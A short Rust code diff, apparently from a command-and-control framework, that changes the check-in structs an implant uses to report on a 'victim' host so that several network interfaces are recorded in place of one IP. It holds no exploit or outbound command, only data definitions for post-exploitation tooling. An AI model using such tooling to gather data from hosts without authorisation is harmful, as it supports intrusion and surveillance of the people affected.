@@ -1,8 +1,7 @@
-use std::sync::Arc;
-use bytes::Bytes;
-use serde::{Deserialize, Serialize};
-use crate::communication_structs::basic_agent_response::BasicAgentResponse;
 use crate::metadata::{Metadata, WithMetadata};
+use crate::network_interface::NetworkInterface;
+use serde::{Deserialize, Serialize};
+use std::sync::Arc;
 
 pub struct PartialCheckin {
 	/// The OS name
@@ -13,8 +12,8 @@ pub struct PartialCheckin {
 	pub domain: String,
 	/// The username of whose runs the agent
 	pub username: String,
-	/// The internal IP of the victim
-	pub ip: String,
+    /// The internal IP(s) of the victim (multiple network interfaces)
+    pub network_interfaces: Vec<NetworkInterface>,
 	/// The process ID of the agent
 	pub process_id: i64,
 	/// The parent process ID of the agent
@@ -38,8 +37,8 @@ pub struct Checkin {
 	pub domain: String,
 	/// The username of whose runs the agent
 	pub username: String,
-	/// The internal IP of the victim
-	pub ip: String,
+    /// The internal IP(s) of the victim (multiple network interfaces)
+    pub network_interfaces: Vec<NetworkInterface>,
 	/// The process ID of the agent
 	pub process_id: i64,
 	/// The parent process ID of the agent
@@ -61,7 +60,7 @@ impl Checkin {
 			hostname: partial.hostname,
 			domain: partial.domain,
 			username: partial.username,
-			ip: partial.ip,
+            network_interfaces: partial.network_interfaces,
 			process_id: partial.process_id,
 			parent_process_id: partial.parent_process_id,
 			process_name: partial.process_name,
